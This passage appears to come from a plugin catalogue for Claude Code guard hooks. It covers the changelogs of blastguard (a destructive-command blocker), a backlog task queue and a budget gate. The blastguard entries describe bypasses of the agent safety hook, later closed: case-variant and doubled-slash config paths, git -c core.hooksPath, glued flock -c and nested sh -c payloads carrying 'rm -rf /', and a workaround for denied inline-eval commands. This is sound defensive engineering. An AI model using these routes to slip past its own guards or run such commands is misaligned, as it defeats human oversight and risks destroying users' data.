protected file by copying onto it was unclassified — the destination is checked in all three shapes (`SRC DEST`, `-t DIR SRC…`, `SRC… DIR/`), sources are ignored so ordinary backups stay Allow. (4) `git -c core.hooksPath=… <subcommand>` (and the glued `-ccore.hooksPath=`, `--config-env` forms) is denied like `git config core.hooksPath`; `git_subcommand_index` already skipped past those values, nothing had read them. Ordinary `cp a.txt b.txt` / `mv` / `sed -i` on source files / `git -c user.name=x` stay Allow. v0.2.17: round-2 adversarial-verifier RED tests for the v0.2.15 protected-path fix — pins 4 confirmed bypasses that still reach protected files as Allow: (1) case-variant paths (`.CLAUDE/Settings.json`, `DENY.TOML`, `.ZSHRC`, …) since exclude.rs does no case-folding on a case-insensitive filesystem; (2) `//`-doubled paths (`.claude//settings.json`) since normalize() never collapses `//`; (3) `cp`/`mv`/`sed -i`/`install` onto a protected path, since detect.rs's command dispatch has no arm for any of them; (4) `git -c core.hooksPath=... <subcommand>`, since only the `git config` subcommand arm inspects that key, not the global `-c` option. All in `detect.rs`'s test module; no production code change. Two narrower findings from writing these tests: `.githooks/PRE-COMMIT` (uppercase basename, lowercase dir) and 3 of 4 `//`-doubled variants (all but the bare `.claude//settings.json` form) already classify to Deny today, because they still match a `**/`-prefixed glob alternative or a wildcard directory component regardless of the exact bypass shape probed — narrower than initially assumed, not a full class fix. v0.2.16: test-only follow-up to v0.2.15's protected-path fix — the independent test author's stale integration mirror (`tests/integration.rs` `config_file_edit_is_allowed_silently`, which pinned the OLD Edit-to-`.claude/settings.json`-is-Allow-and-silent behavior) is renamed to `config_file_edit_to_protected_path_is_denied` and now asserts Deny + surfaced; `rule_id.rs`'s `every_detect_deny_path_maps_to_a_known_rule_id` gained cases for the `protected-path` and `git-config-hookspath` rule ids (Write/Edit/truncating-redirect/append-redirect to a protected path, and `git config core.hooksPath`), which were added in v0.2.15 but not yet exercised by that completeness test. No production code change. v0.2.15: protected gate/config paths are now CLASSIFIED instead of auto-Allowed. `exclude::is_protected_path` names the files that decide whether the gates run at all (`.claude/settings.json` / `settings.local.json` / `hooks.json` / `.claude/hooks/**`, `.githooks/**`, `.git/hooks/**`, shell rc files, and the gate-config tomls `deny.toml`/`donegate.toml`/`specguard.toml`/`tdd.toml`/…), and it is checked BEFORE the `is_config_file` allowlist that used to short-circuit them to Allow. Write, Edit/MultiEdit/NotebookEdit (previously ALWAYS Allow, regardless of path), truncating redirects and APPEND redirects (`>>`, previously skipped as non-truncating) all resolve to Deny on such a target, and `git config core.hooksPath` (a one-command swap of every git hook) is denied unless a read-only flag is present. The extension-wide `*.toml` allowance is deliberately kept, so an ordinary `Cargo.toml` write stays Allow; new rule ids `protected-path` and `git-config-hookspath` keep the class visible to overwatch. v0.2.14: internal-only refactor — `detect.rs`'s `VerdictAcc` (the `Deny > Ask > Allow` sub-analysis combinator) now accumulates `harness_core::verdict::Verdict` internally and ranks via the new shared `Verdict::worst_of` combinator, translating back to `Decision` at the boundary (`decision_to_verdict`/`verdict_to_decision`). The public `Decision` enum and its methods (`is_blocking`/`is_deny`/`is_ask`/`hardened`) are byte-for-byte unchanged, and every pre-existing test passes unmodified; new tests pin `VerdictAcc`'s priority ordering directly. Kills a hand-rolled reinvention of the same three-valued-verdict priority already shared by propguard/reviewgate. No behavior change. v0.2.13: documented the diffrisk/callgraph modules (README.ja.md) — semantic diff-risk signals (sensitive-path globs, public-API changes) and the lexical caller-enumeration scanner, plus how condukt's diffrisk_record.rs wires both into a ViolationSource::Blastguard event for overwatch; these existed only in GLOSSARY.md before, not blastguard's own README. No code change. v0.2.12: documented backlog cd99fa2c judgment for blastguard:code-interpreter-inline-eval (README.ja.md) with a concrete example observed live in this session — a purely read-only `python3 -c` invocation (parsing a JSONL transcript with json.loads and printing matches) was denied because is_inline_eval_flag does not inspect payload contents. Judged intentional, same D1-class false-positive tradeoff as truncating-redirect: no reliable syntactic way to prove a `-c`/`-e`/`-r` payload is read-only (os.system/eval/obfuscated calls can hide in the same string), so no code change. Workaround remains jq/grep or writing a script file and running it with no inline-eval flag. v0.2.11: fixed a genuine false-positive in redirect_targets (crates/blastguard/src/detect.rs) found while investigating backlog ba72dc46 — the target-token scanner did not treat `)` as a terminator, so a redirect inside a command substitution (`$(cmd 2>/dev/null)`) had its target read as `/dev/null)` instead of `/dev/null`, failing redirect_target_is_safe's exact match and denying a command that touches no file at all. `)` is now a token terminator alongside whitespace/`;`/`|`/`&`/`>`; a control test confirms a real truncating redirect immediately followed by `)` in prose is still denied. v0.2.10: documented backlog ba72dc46/cd99fa2c findings (README.ja.md) — the REMAINING truncating-redirect denies (scratchpad/tmp writes) and all code-interpreter-inline-eval denies are intentional design, not fail-opens; no code change for those. v0.2.5: blastguard adopted the `harness_core::verdict` type contract. `SensitiveConfig::build`/`any_sensitive` (diff-risk sensitive-path globs) used to swallow a bad `Glob::new` and `unwrap_or_else(|_| GlobSet::empty())` a failed build, making "could not compile your sensitive-path list" byte-for-byte identical to "none of these paths is sensitive" — a fail-open that flowed through classify_diff/classify_change into condukt's force-gate and gate-check verdicts. Both now return `Determination<GlobSet>`/`Determination<bool>`: no error is swallowed, a partially-compiled set is never used, and the reason names the offending pattern. All four consuming call sites resolve `Undetermined` to the RESTRICTED side (gate_exec -> Escalate, schedule -> force-gate, review_brief -> High with a driver line that distinguishes "could not check" from a measured hit, diffrisk_record -> its own rule id). A trybuild compile-fail suite pins from blastguard's own vantage point that `Verdict::Clean` cannot be fabricated (E0603 private witness) and that `Determination` has no `unwrap_or`/`ok`/`unwrap_or_default` (E0599), plus an end-to-end test pinning that the `Ask` hardening rule (Deny unless CLAUDE_CODE_ENTRYPOINT=cli) is unchanged. v0.2.4: closed a verified fail-open where a destructive command hand-nested in `sh -c "…"` layers escaping ONLY the double-quote (the naive way a human nests, leaving prior backslashes) was ALLOWED from depth 4 down (99b506b7). The accreting `\"` runs make `first_shell_word`'s faithful POSIX unquoting truncate the `-c` payload before the destructive command (`rm -rf /` dropped), and the trailing tokens are then read as the shell's positional operands, so no candidate normalised to `rm`. New `denoised_eval_rescan` is a scoped WIDENING backstop: only on shell-EVAL regions (`-c`/eval operand, genuinely code — never plain operands, so `grep -rn 'rm -rf' src/` is untouched) and only when a backslash is present (the construct that defeats extraction), it strips the escape/quote punctuation and re-scans every resulting position with the full rule engine, so the destructive word is found and denied at any depth while the same nesting shape around a benign payload (`echo hi`) stays Allow. Wired into all three shell-eval arms (shell `-c`, `eval`/`exec`/`source`, `flock -c`). v0.2.2: the recursion-depth cap (MAX_SHELL_DEPTH) reaching its limit no longer resolves to Allow — a destructive command nested past the cap via `sh -c`/`xargs`/`find -exec` used to pass PreToolUse UNANALYSED (4b7b80d3). New `depth_exhausted()` returns an Ask (the same 'analysis did not finish' answer as the sibling budget-exhaustion guard) that `Decision::hardened` turns into the pre-existing Deny when no human can answer; all five depth-capped sites (analyze_segment / unknown_wrapper_ask / analyze_command_at / analyze_find / analyze_xargs) now record/return it instead of falling through to Allow, and a distinct `analysis-depth-exhausted` rule_id keeps the depth cause separable from the budget one in the logs. v0.2.1: `flock`'s command-string payload is now extracted from the GLUED forms, closing a verified depth-0 Allow bypass (138607bc): the attached long form `flock /l --command='rm -rf /'` and the glued short form `flock /l -c'rm -rf /'` both slipped through because `payloads_after` only inspected tokens AFTER the flag, never the value fused into the flag token itself. New `inline_command_payloads` splices the in-token remainder (after `=` for `--command=`, after `c` for `-c…`) back in front of the following tokens and reuses the same first-word/quote-peel candidate logic, so an inline destructive payload is re-analysed and denied; benign inline payloads stay allowed. v0.1.23: `is_angle_placeholder_close` now recognizes non-ASCII UTF-8 bytes as identifier chars, not just `[A-Za-z0-9_-]` — a condukt done_criteria string with a Japanese placeholder (`<同一key>`) was misread as a truncating redirect whose target was the following prose, force-gating an ordinary task as High/irreversible (the 2026-07-17 false-gate incident). Destructive-operation guard for Claude Code: a PreToolUse hook that denies project-wrecking Bash commands and file operations (recursive/wildcard rm, git reset --hard, git clean -fd, single-> truncating overwrites, truncate/shred/mkfs/dd of=, recursive chmod/chown, find -delete, find -ok/-okdir, bare top-level interpreter inline-eval, stacked/versioned interpreter flags, tee truncation) before they run, while exempting repo config files (.claude/**, *.toml, *.yaml/yml, *.lock, package.json, .config/**). Subscription-native (one PreToolUse hook + bundled Rust binary, no API key).

plugins.name: backlog
plugins.description: Cross-project task queue with cycle-type tags for Claude Code: a /backlog skill that loops through open items (lock → pick → /condukt → done), a SessionStart hook that surfaces pending work at session open, and a backlog binary with list/next/done/fail/lock subcommands. v0.2.10: adds probe_path_env_lock_actually_serializes_concurrent_holders, a deterministic proof that PROBE_PATH_ENV_LOCK actually serializes holders (F->P oracle for the v0.2.9 fix). v0.2.9: store.rs のテストに PROBE_PATH_ENV_LOCK を追加し、real-git-init テストと PATH-hijack テストの並列実行レースを解消。 v0.2.8 bounds `git_remote_origin_url`'s `git config --get remote.origin.url` invocation with a 5s timeout (harness_core::boundary::run_with_timeout) instead of spawning it unbounded via a raw `Command::output()`, since a hung `git` (corrupt/locked index, wedged credential helper, stuck fsmonitor/hook subprocess) could otherwise block the `Add` command's caller indefinitely; a timeout (like any other git failure) now fails soft to an empty remote URL, same as today. v0.2.7 bounds `gh_probe`'s `gh` invocation with a 20s timeout (harness_core::boundary::run_with_timeout) instead of spawning it unbounded, since add_with_weight_and_github_push calls gh_probe from inside the tasks-file lock's critical section and a hung gh could otherwise hold that lock indefinitely and block every other session's backlog add/next --claim; a timeout now fails soft to local-only, same as gh being absent. v0.2.6 makes is_github_remote compare the parsed host exactly against github.com instead of a substring match, so lookalike hosts (github.company.internal, github.com.evil.example) or a github.com occurrence in the path/query of a different host no longer false-positive as a GitHub remote. v0.2.5 wires the fail-soft one-way GitHub-issue push end to end: `backlog add` against a github.com-remote project now calls `gh issue create` (via an injected runner, mirroring condukt::pr) inside the same tasks-file-lock critical section as the add, and on success persists issue_number/issue_url on the new Task; a non-GitHub remote, absent gh, or a failed gh invocation all fail-soft to the pre-existing local-only add. v0.2.4 adds issue_number/issue_url (Option, serde default) fields to Task to hold a linked GitHub issue reference; backward-compatible with existing tasks.toml records. v0.2.3 adds a GitHub issue-create helper module (github.rs). v0.2.2 changes `backlog list`'s default scope to the cwd-resolved project (matching what `add --project "$PWD"` would have stored) instead of cross-project; pass `--all` to keep the old cross-project default (an explicit `--project` still wins over both). v0.1.14 closes a project-key normalization gap in harness_core::discovery::resolve_repo_root's last-resort fallback (used by canonicalize_project for --project values): when a path is not a git repo (or git is absent) AND fs::canonicalize fails because the path doesn't exist locally (e.g. written by a different machine/worktree), the fallback previously returned the raw, unresolved cwd verbatim -- no `.`/`..` collapsing, no trailing-slash stripping -- so `/foo/bar/`, `/foo/./bar`, and `/foo/baz/../bar` could each resolve to a DIFFERENT key for the SAME logical path, silently fragmenting one project's tasks/records across multiple stores. A new filesystem-independent `lexical_normalize` (Path::components()-based, no canonicalize/stat) is now the final fallback so the same logical path always collapses to the same key. v0.1.13 fails the next_claim read-modify-write CLOSED when the tasks-file lock cannot be acquired: with_tasks_lock ran its closure UNPROTECTED on a degraded acquire (contention/FS error), so concurrent next_claim callers could read the same pending task and mark it claimed in each -- dispatching ONE task to multiple processes. A new with_tasks_lock_aware tells the claim RMW whether the exclusive lock is actually held; when it is not, the claim now DECLINES (returns no task) and retries on the next tick rather than racing. Best-effort mutators keep the fail-soft with_tasks_lock (lost-update at worst, not double-dispatch). Deterministic regression test via the locked seam. v0.1.12 fixes a real lost-update race in add_with_weight/next_claim under heavy concurrent contention: the tasks-file lock's retry budget was sized for one legitimate holder's worst-case hold (300ms), not N holders queuing serially, so heavy contention (10 adders + 10 claimers) could exceed the budget and force an unprotected fallback that lost updates; budget raised from ~2s to ~8s, proven by a previously-red stress test now green. v0.1.11 adds a regression test proving the v0.1.10 heartbeat_at+TTL fix works without waiting the real 30-minute TTL (rewrites on-disk heartbeat_at back past the TTL, then confirms `backlog lock heartbeat` refreshes/protects it and an un-heartbeated lock is correctly reaped). v0.1.10 fixes backlog::lock's cross-session mutual exclusion: staleness was judged by the recorded pid's liveness, but that pid is always the one-shot `backlog lock acquire` CLI's own pid (dead again the instant the command returns), so any lock could be immediately stolen by another session regardless of whether the holder was still active. Staleness is now judged by a `heartbeat_at` timestamp + 30-minute TTL (matching condukt's task-claim and overwatch's lease registries), with a new `backlog lock heartbeat` subcommand. Subscription-native (skill + hook + bundled Rust binary, no API key).

plugins.name: budgetguard
plugins.description: v0.1.16: verdict-path audit (docs/audit-budgetguard-verdict-paths.md) closed seven fail-open paths. A budgetguard.toml that exists but cannot be read or PARSED no longer degrades to Config::default() — whose all-zero limits mean 'no limit', so one TOML typo silently disarmed the gate (measured: verdict(999,999)==Allow); config loading is now tri-state and an unreadable config blocks. A ledger lock that could not be acquired no longer proceeds with an unserialized read-modify-write; the day total is reported unmeasured instead of as headroom. An unreadable lock file is no longer assumed stale and stolen from a live session. A genuinely ABSENT config still means 'configured nothing' and still allows. v0.1.13: new `emit_violation(root, session, check_kind)` records an `overwatch` `ViolationSource::Budgetguard` event when a Stop is blocked for exceeding session/daily budget, feeding the unified review-queue. Real-time cost budget gate for Claude Code: on Stop, read the session transcript, compute USD cost, and block the turn when session or daily limits are exceeded — feeding the overage back so the agent winds down gracefully. Subscription-native (one Stop hook + bundled Rust binary, no API key). v0.1.11: Stop hook now runs under harness-core's run_guarded panic barrier (fail-closed block on crash instead of silent allow).
